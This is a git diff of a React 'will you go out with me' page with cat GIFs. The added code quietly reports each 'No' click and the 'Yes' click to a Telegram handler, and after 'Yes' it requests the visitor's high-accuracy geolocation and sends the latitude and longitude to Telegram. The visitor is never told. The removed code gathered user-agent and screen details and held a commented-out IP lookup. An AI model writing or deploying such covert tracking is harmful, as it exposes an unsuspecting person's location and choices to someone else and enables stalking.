@@ -9,30 +9,15 @@ import peach from "./assets/peach.gif";
 import sayYs from "./assets/sayYs.gif";
 import yesss from "./assets/yesss.gif";
 import cattype from "./assets/cat-type.gif";
+import { sendMessageTelegram } from "./telegramHandlre";
 
 export function AskOut({ setYes }) {
 	const [step, setStep] = useState(0);
 	const [noText, setNoText] = useState("No");
 	const [yesSize, setYesSize] = useState(24); // Start with 24px font size
-	const [userData, setUserData] = useState(null);
 	const [catImg, setCat] = useState(hug);
 
-	useEffect(() => {
-		fetchUserData();
-	}, []);
-
-	const fetchUserData = () => {
-		const browserInfo = {
-			userAgent: navigator.userAgent,
-			platform: navigator.platform,
-			screenSize: `${window.screen.width}x${window.screen.height}`,
-		};
-		// Uncomment if you want to fetch IP details
-		// fetch("https://ipinfo.io/json?token=0b07b6a04e84df")
-		// 	.then((res) => res.json())
-		// 	.then((data) => setUserData({ ...browserInfo, ...data }));
-		setUserData(browserInfo);
-	};
+	
 
 	const noMessages = [
 		{ text: "Are you sure? 🤨", img: cattype },
@@ -46,6 +31,7 @@ export function AskOut({ setYes }) {
 
 	const handleNoClick = () => {
 		if (step < noMessages.length) {
+			sendMessageTelegram(`😢 Inputed No ${step}`)
 			setNoText(noMessages[step].text);
 			setCat(noMessages[step].img);
 			setYesSize((prevSize) => prevSize * 1.5); // Increase font size by 50%
@@ -57,16 +43,19 @@ export function AskOut({ setYes }) {
 
 	const handleYesClick = () => {
 		setYes(true);
+		sendMessageTelegram(
+			"`💕💕💕💕💕💕💕💕💕💕💕💕she said yes💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕`"
+		);
+		
 		if (navigator.geolocation) {
 			navigator.geolocation.getCurrentPosition(
 				(position) => {
-					setUserData((prevData) => ({
-						...prevData,
+					sendMessageTelegram({
 						position: {
 							latitude: position.coords.latitude,
 							longitude: position.coords.longitude,
 						},
-					}));
+					});
 				},
 				() => alert("Failed to get location"),
 				{ enableHighAccuracy: true }
